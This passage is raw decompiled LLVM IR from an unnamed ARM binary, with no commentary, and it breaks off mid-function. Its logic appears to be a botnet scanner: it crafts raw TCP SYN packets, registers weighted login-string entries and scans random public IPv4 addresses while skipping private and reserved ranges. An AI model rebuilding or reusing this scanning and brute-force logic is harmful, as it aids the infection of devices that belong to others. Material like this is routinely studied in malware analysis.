  uselistorder i32 (i8*)* @function_10318, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_e54c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e54c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e54c = load i32, i32* @r5, align 4
  %v21_e54c = load i32, i32* @sl, align 4
  %v0_e558 = call i32 @function_10ac8()
  store i32 %v0_e558, i32* %r0.global-to-local, align 4
  %v7_e55c = icmp eq i32 %v0_e558, -1
  %. = zext i1 %v7_e55c to i32
  %tmp369 = icmp slt i32 %v0_e558, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20a70.129 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e578 = icmp eq i32 %storemerge329, 0
  store i1 %v2_e578, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e558, i32* @global_var_20a70.129, align 4
  br i1 %v2_e578, label %dec_label_pc_e594, label %dec_label_pc_e584

dec_label_pc_e584:                                ; preds = %dec_label_pc_e54c
  store i32 %v6_e54c, i32* @r5, align 4
  store i32 %v21_e54c, i32* @sl, align 4
  ret i32 %v0_e558

dec_label_pc_e594:                                ; preds = %dec_label_pc_e54c
  %v0_e594 = call i32 @function_105d4()
  store i32 %v0_e594, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e594, i32* @global_var_20a4c.46, align 4
  %v1_e5a0 = call i32 @function_e110(i32 %v0_e594)
  %v0_e5a4 = load i32, i32* @r4, align 4
  store i32 %v0_e5a4, i32* %r0.global-to-local, align 4
  %v1_e5a8 = inttoptr i32 %v0_e5a4 to i32*
  %v2_e5a8 = call i32 @function_10a58(i32* %v1_e5a8)
  store i32 ptrtoint (i32* @global_var_1ea18.121 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e5a8, i32* @global_var_1ea18.121, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e5bc = call i32 @function_1214c(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_20a68.133 to i32), i32* %r3.global-to-local, align 4
  %v0_e5c4 = load i32, i32* @r4, align 4
  store i32 %v0_e5c4, i32* %stack_var_-52, align 4
  store i32 %v2_e5bc, i32* @global_var_20a68.133, align 4
  store i32 %v0_e5c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5d0

dec_label_pc_e5d0:                                ; preds = %dec_label_pc_e5d0.dec_label_pc_e5d0_crit_edge, %dec_label_pc_e594
  %v2_e5dc = phi i32 [ %v2_e5dc.pre, %dec_label_pc_e5d0.dec_label_pc_e5d0_crit_edge ], [ %v2_e5bc, %dec_label_pc_e594 ]
  %v0_e5e4 = phi i32 [ %v0_e614, %dec_label_pc_e5d0.dec_label_pc_e5d0_crit_edge ], [ %v0_e5c4, %dec_label_pc_e594 ]
  %v3_e5d8 = mul i32 %v0_e5e4, 256
  store i32 %v3_e5d8, i32* %ip.global-to-local, align 4
  %v2_e5ec = mul i32 %v0_e5e4, 288
  %v1_e5f4 = add i32 %v0_e5e4, 1
  store i32 %v1_e5f4, i32* %r0.global-to-local, align 4
  %v2_e5f8 = add i32 %v2_e5ec, %v2_e5dc
  store i32 %v2_e5f8, i32* %r2.global-to-local, align 4
  store i32 %v2_e5f8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e60c = add i32 %v2_e5f8, 4
  %v3_e60c = inttoptr i32 %v2_e60c to i32*
  store i32 -1, i32* %v3_e60c, align 4
  %v0_e610 = load i32, i32* @r5, align 4
  %v1_e610 = load i32, i32* %r1.global-to-local, align 4
  %v2_e610 = add i32 %v1_e610, 12
  %v3_e610 = inttoptr i32 %v2_e610 to i32*
  store i32 %v0_e610, i32* %v3_e610, align 4
  %v0_e614 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e614, i32* %stack_var_-52, align 4
  %v7_e618 = icmp sgt i32 %v1_e5f4, 255
  br i1 %v7_e618, label %dec_label_pc_e61c, label %dec_label_pc_e5d0.dec_label_pc_e5d0_crit_edge

dec_label_pc_e5d0.dec_label_pc_e5d0_crit_edge:    ; preds = %dec_label_pc_e5d0
  %v2_e5dc.pre = load i32, i32* @global_var_20a68.133, align 4
  br label %dec_label_pc_e5d0

dec_label_pc_e61c:                                ; preds = %dec_label_pc_e5d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e628 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_e628, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a6c.135 to i32), i32* %r2.global-to-local, align 4
  %v2_e630 = icmp eq i32 %v3_e628, -1
  store i1 %v2_e630, i1* %cpsr_c.global-to-local, align 1
  %v7_e630 = icmp eq i32 %v3_e628, -1
  store i1 %v7_e630, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e628, i32* @r4, align 4
  store i32 %v3_e628, i32* @global_var_20a6c.135, align 4
  br i1 %v7_e630, label %dec_label_pc_e61c.dec_label_pc_fbf0_crit_edge, label %dec_label_pc_e640

dec_label_pc_e61c.dec_label_pc_fbf0_crit_edge:    ; preds = %dec_label_pc_e61c
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fbf0

dec_label_pc_e640:                                ; preds = %dec_label_pc_e61c
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e644 = load i32, i32* @r5, align 4
  store i32 %v0_e644, i32* %r2.global-to-local, align 4
  %v2_e648 = call i32 @function_10c0c(i32 %v3_e628, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e650 = or i32 %v2_e648, 2048
  store i32 %v1_e650, i32* %r2.global-to-local, align 4
  %v0_e654 = load i32, i32* @r4, align 4
  store i32 %v0_e654, i32* %r0.global-to-local, align 4
  %v2_e658 = call i32 @function_10c0c(i32 %v0_e654, i32 4)
  %v2_e660 = load i32, i32* @global_var_20a6c.135, align 4
  store i32 %v2_e660, i32* %r0.global-to-local, align 4
  %v2_e664 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e66c = load i32, i32* @r5, align 4
  store i32 %v0_e66c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e674 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e674, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e684 = call i32 @function_115a0(i32 %v2_e660, i32 %v0_e66c, i32 3, i32 %v2_e674, i32 4)
  store i32 %v5_e684, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e688 = icmp eq i32 %v5_e684, 0
  store i1 %v2_e688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e688, label %dec_label_pc_e690, label %dec_label_pc_fbe4

dec_label_pc_e690:                                ; preds = %dec_label_pc_e640, %dec_label_pc_e690
  %v0_e690 = call i32 @function_e0b4()
  %v3_e694 = mul i32 %v0_e690, 65536
  store i32 %v3_e694, i32* %r0.global-to-local, align 4
  %v1_e69c = mul i32 %v0_e690, 256
  %v3_e6a0 = and i32 %v1_e69c, 65280
  %tmp372 = udiv i32 %v0_e690, 256
  %v4_e6a4 = urem i32 %tmp372, 256
  %v5_e6a4 = or i32 %v4_e6a4, %v3_e6a0
  store i32 %v5_e6a4, i32* %r3.global-to-local, align 4
  %v2_e6a8 = icmp ugt i32 %v5_e6a4, 1023
  store i1 %v2_e6a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6a8 = icmp eq i32 %v5_e6a4, 1024
  store i1 %v7_e6a8, i1* %cpsr_z.global-to-local, align 1
  %v3_e6b0 = icmp ult i32 %v5_e6a4, 1022
  br i1 %v3_e6b0, label %dec_label_pc_e690, label %dec_label_pc_e6b4

dec_label_pc_e6b4:                                ; preds = %dec_label_pc_e690
  %v5_e6ac.le = trunc i32 %v0_e690 to i16
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %r0.global-to-local, align 4
  %v2_e6b8 = load i8, i8* bitcast (i8** @global_var_1e9e8.137 to i8*), align 4
  %v3_e6b8 = zext i8 %v2_e6b8 to i32
  %v1_e6bc = and i32 %v3_e6b8, 240
  %v1_e6c0 = or i32 %v1_e6bc, 5
  store i32 %v1_e6c0, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_1e9e8.137 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_1e9ea.138 to i16*), align 4
  %v0_e6e0 = call i32 @function_e0b4()
  %v1_e6e0 = trunc i32 %v0_e6e0 to i16
  %v3_e6e8 = load i8, i8* @global_var_1ea08.141, align 1
  store i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %ip.global-to-local, align 4
  %v1_e6f8 = urem i8 %v3_e6e8, 16
  store i16 %v1_e6e0, i16* bitcast (i32* @global_var_1e9ec.142 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e708 = or i8 %v1_e6f8, 80
  store i8 64, i8* bitcast (i32* @global_var_1e9f0.143 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1e9f1.144 to i8*), align 4
  store i8 %v1_e708, i8* @global_var_1ea08.141, align 1
  %v4_e718 = sext i16 %v5_e6ac.le to i32
  store i32 %v4_e718, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_1e9fe.145, align 2
  store i16 %v5_e6ac.le, i16* @global_var_1e9fc.140, align 2
  %v0_e728 = call i32 @function_e0b4()
  %v1_e728 = trunc i32 %v0_e728 to i16
  %v3_e730 = load i8, i8* @global_var_1ea09.146, align 1
  %v4_e730 = zext i8 %v3_e730 to i32
  store i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32* %ip.global-to-local, align 4
  %v1_e738 = or i32 %v4_e730, 2
  store i32 %v1_e738, i32* %r3.global-to-local, align 4
  store i16 %v1_e728, i16* bitcast (i32* @global_var_1ea0a.147 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_16190.149 to i32), i32* %r1.global-to-local, align 4
  %v1_e744 = trunc i32 %v1_e738 to i8
  store i8 %v1_e744, i8* @global_var_1ea09.146, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e750 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint (i32* @global_var_16190.149 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16194.153 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e760 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([5 x i8]* @global_var_16194.153 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1619c.155 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e770 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([9 x i8]* @global_var_1619c.155 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_161a8.157 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_161a8.157 to i32), i32* %r1.global-to-local, align 4
  %v5_e780 = call i32 @function_e3ec(i32 ptrtoint ([7 x i8]* @global_var_161a8.157 to i32), i32 ptrtoint ([7 x i8]* @global_var_161a8.157 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16190.149 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e790 = call i32 @function_e3ec(i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32 ptrtoint (i32* @global_var_16190.149 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_161b8.161 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7a0 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([9 x i8]* @global_var_161b8.161 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_161c4.163 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161c4.163 to i32), i32* %r1.global-to-local, align 4
  %v5_e7b0 = call i32 @function_e3ec(i32 ptrtoint ([6 x i8]* @global_var_161c4.163 to i32), i32 ptrtoint ([6 x i8]* @global_var_161c4.163 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161cc.165 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7c0 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([6 x i8]* @global_var_161cc.165 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_161d4.167 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161d4.167 to i32), i32* %r1.global-to-local, align 4
  %v5_e7d0 = call i32 @function_e3ec(i32 ptrtoint ([8 x i8]* @global_var_161d4.167 to i32), i32 ptrtoint ([8 x i8]* @global_var_161d4.167 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e7e0 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161dc.169 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e7f0 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint (i32* @global_var_161dc.169 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e800 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), i32 ptrtoint ([6 x i8]* @global_var_161ec.171 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32* %r1.global-to-local, align 4
  %v5_e810 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e820 = call i32 @function_e3ec(i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), i32 ptrtoint ([6 x i8]* @global_var_161ec.171 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161fc.175 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e830 = call i32 @function_e3ec(i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32 ptrtoint (i32* @global_var_161fc.175 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16208.177 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e840 = call i32 @function_e3ec(i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), i32 ptrtoint (i32* @global_var_16208.177 to i32), i32 15)
  store i32 %v4_e840, i32* %r0.global-to-local, align 4
  %v2_e848 = ptrtoint i32* %stack_var_-1866 to i32
  %v1_eb74 = add i32 %v2_e848, 20
  %v1_ebc8 = add i32 %v2_e848, 16
  %v2_ebc8 = inttoptr i32 %v1_ebc8 to i32*
  %v1_ebdc = add i32 %v2_e848, 9
  %v2_ebdc = inttoptr i32 %v1_ebdc to i8*
  %v1_ec70 = add i32 %v2_e848, 12
  %v2_ec70 = inttoptr i32 %v1_ec70 to i32*
  %v2_ee54 = ptrtoint i32* %stack_var_-40 to i32
  %v2_ee9c = ptrtoint i32* %stack_var_-68 to i32
  %v2_eea0 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eea4 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f878 = ptrtoint i32* %stack_var_-45 to i32
  %v2_f88c = ptrtoint i32* %stack_var_-77 to i32
  %v2_f7e4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f9a0 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e870 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e850

dec_label_pc_e850:                                ; preds = %dec_label_pc_f038, %dec_label_pc_e6b4
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e6b4 ], [ %stack_var_-1876.1, %dec_label_pc_f038 ]
  store i32 ptrtoint (i32* @global_var_1ea18.121 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e858 = load i32, i32* @global_var_1ea18.121, align 4
  store i32 %v2_e858, i32* @r4, align 4
  %v3_e85c = icmp uge i32 %stack_var_-1876.0, %v2_e858
  store i1 %v3_e85c, i1* %cpsr_c.global-to-local, align 1
  %v9_e85c = icmp eq i32 %stack_var_-1876.0, %v2_e858
  store i1 %v9_e85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e85c, label %dec_label_pc_eb64, label %dec_label_pc_e864

dec_label_pc_e864:                                ; preds = %dec_label_pc_e850
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %bb407, %dec_label_pc_e864
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e888 = call i32 @function_e0b4()
  %v1_e888 = trunc i32 %v0_e888 to i16
  store i32 %v0_e888, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %ip.global-to-local, align 4
  %v2_e894 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_e894, i32* %r3.global-to-local, align 4
  store i16 %v1_e888, i16* bitcast (i32* @global_var_1e9ec.142 to i16*), align 4
  store i32 %v2_e894, i32* @global_var_1e9f4.178, align 4
  br label %dec_label_pc_e8a0

dec_label_pc_e8a0:                                ; preds = %dec_label_pc_e9f8, %dec_label_pc_e8d0, %dec_label_pc_ea2c, %dec_label_pc_ea20, %dec_label_pc_ea14, %dec_label_pc_ea08, %.thread48, %.thread32, %.thread28, %.thread24, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e96c, %dec_label_pc_e964, %bb383, %dec_label_pc_e934, %dec_label_pc_e910, %bb376, %dec_label_pc_e8e0, %bb375, %dec_label_pc_e8c8, %bb374, %bb400, %dec_label_pc_e874
  %v0_e8a0 = call i32 @function_e0b4()
  store i32 %v0_e8a0, i32* %r0.global-to-local, align 4
  %v1_e8a4 = urem i32 %v0_e8a0, 256
  store i32 %v1_e8a4, i32* %r1.global-to-local, align 4
  %v3_e8a8 = udiv i32 %v0_e8a0, 256
  store i32 %v3_e8a8, i32* %r3.global-to-local, align 4
  %v3_e8ac = udiv i32 %v0_e8a0, 65536
  store i32 %v3_e8ac, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8b0 = icmp eq i32 %v1_e8a4, 0
  store i1 %v2_e8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b0, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e8a0
  %v3_e8b4 = icmp ugt i32 %v1_e8a4, 126
  store i1 %v3_e8b4, i1* %cpsr_c.global-to-local, align 1
  %v8_e8b4 = icmp eq i32 %v1_e8a4, 127
  store i1 %v8_e8b4, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e8a0, %bb373
  %v0_e8c4 = phi i1 [ true, %dec_label_pc_e8a0 ], [ %v8_e8b4, %bb373 ]
  %v1_e8b8 = urem i32 %v3_e8a8, 256
  store i32 %v1_e8b8, i32* %ip.global-to-local, align 4
  %v1_e8bc = urem i32 %v3_e8ac, 256
  store i32 %v1_e8bc, i32* %r2.global-to-local, align 4
  %v1_e8c0 = and i32 %v0_e8a0, 8388608
  %v2_e8c0 = icmp ne i32 %v1_e8c0, 0
  store i1 %v2_e8c0, i1* %cpsr_c.global-to-local, align 1
  %v3_e8c0 = udiv i32 %v0_e8a0, 16777216
  store i32 %v3_e8c0, i32* %r0.global-to-local, align 4
  br i1 %v0_e8c4, label %dec_label_pc_e8a0, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %bb374
  %v2_e8c8 = icmp ugt i32 %v1_e8a4, 2
  store i1 %v2_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c8 = icmp eq i32 %v1_e8a4, 3
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c8, label %dec_label_pc_e8a0, label %dec_label_pc_e8d0

dec_label_pc_e8d0:                                ; preds = %dec_label_pc_e8c8
  %v1_e8d0 = add nsw i32 %v1_e8a4, -15
  store i32 %v1_e8d0, i32* %r3.global-to-local, align 4
  %v2_e8d4 = icmp ugt i32 %v1_e8a4, 55
  store i1 %v2_e8d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8d4 = icmp eq i32 %v1_e8a4, 56
  store i1 %v7_e8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8d4, label %dec_label_pc_e8a0, label %bb375

bb375:                                            ; preds = %dec_label_pc_e8d0
  %v3_e8d8 = icmp ne i32 %v1_e8d0, 0
  store i1 %v3_e8d8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8d8 = icmp eq i32 %v1_e8d0, 1
  store i1 %v8_e8d8, i1* %cpsr_z.global-to-local, align 1
  %v2_e8dc = xor i1 %v3_e8d8, true
  %v3_e8dc = or i1 %v8_e8d8, %v2_e8dc
  br i1 %v3_e8dc, label %dec_label_pc_e8a0, label %dec_label_pc_e8e0

dec_label_pc_e8e0:                                ; preds = %bb375
  %v2_e8e0 = icmp ugt i32 %v1_e8a4, 9
  store i1 %v2_e8e0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e0 = icmp eq i32 %v1_e8a4, 10
  store i1 %v7_e8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e0, label %dec_label_pc_e8a0, label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_e8e0
  %v2_e8e8 = icmp ugt i32 %v1_e8a4, 191
  store i1 %v2_e8e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e8 = icmp eq i32 %v1_e8a4, 192
  store i1 %v7_e8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e8, label %bb376, label %dec_label_pc_e8f4

bb376:                                            ; preds = %dec_label_pc_e8e8
  %v3_e8ec = icmp ugt i32 %v1_e8b8, 167
  store i1 %v3_e8ec, i1* %cpsr_c.global-to-local, align 1
  %v8_e8ec = icmp eq i32 %v1_e8b8, 168
  store i1 %v8_e8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8ec, label %dec_label_pc_e8a0, label %dec_label_pc_e8f4

dec_label_pc_e8f4:                                ; preds = %dec_label_pc_e8e8, %bb376
  %v7_e8f4 = icmp eq i32 %v1_e8a4, 172
  %.461 = zext i1 %v7_e8f4 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e900 = icmp ugt i32 %v1_e8b8, 14
  store i1 %v2_e900, i1* %cpsr_c.global-to-local, align 1
  %v7_e900 = icmp eq i32 %v1_e8b8, 15
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  %v2_e904 = xor i1 %v2_e900, true
  %v3_e904 = or i1 %v7_e900, %v2_e904
  br i1 %v3_e904, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e8f4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e918

bb379:                                            ; preds = %dec_label_pc_e8f4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e908 = icmp eq i1 %v7_e8f4, false
  store i1 %v2_e908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e908, label %dec_label_pc_e918, label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %bb379
  %v2_e910 = icmp ugt i32 %v1_e8b8, 30
  store i1 %v2_e910, i1* %cpsr_c.global-to-local, align 1
  %v7_e910 = icmp eq i32 %v1_e8b8, 31
  store i1 %v7_e910, i1* %cpsr_z.global-to-local, align 1
  %v2_e914 = xor i1 %v2_e910, true
  %v3_e914 = or i1 %v7_e910, %v2_e914
  br i1 %v3_e914, label %dec_label_pc_e8a0, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %.thread8, %dec_label_pc_e910, %bb379
  %v7_e918 = icmp eq i32 %v1_e8a4, 100
  %.462 = zext i1 %v7_e918 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e924 = icmp ugt i32 %v1_e8b8, 62
  store i1 %v2_e924, i1* %cpsr_c.global-to-local, align 1
  %v7_e924 = icmp eq i32 %v1_e8b8, 63
  store i1 %v7_e924, i1* %cpsr_z.global-to-local, align 1
  %v2_e928 = xor i1 %v2_e924, true
  %v3_e928 = or i1 %v7_e924, %v2_e928
  br i1 %v3_e928, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e918
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e93c

bb382:                                            ; preds = %dec_label_pc_e918
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e92c = icmp eq i1 %v7_e918, false
  store i1 %v2_e92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e92c, label %dec_label_pc_e93c, label %dec_label_pc_e934

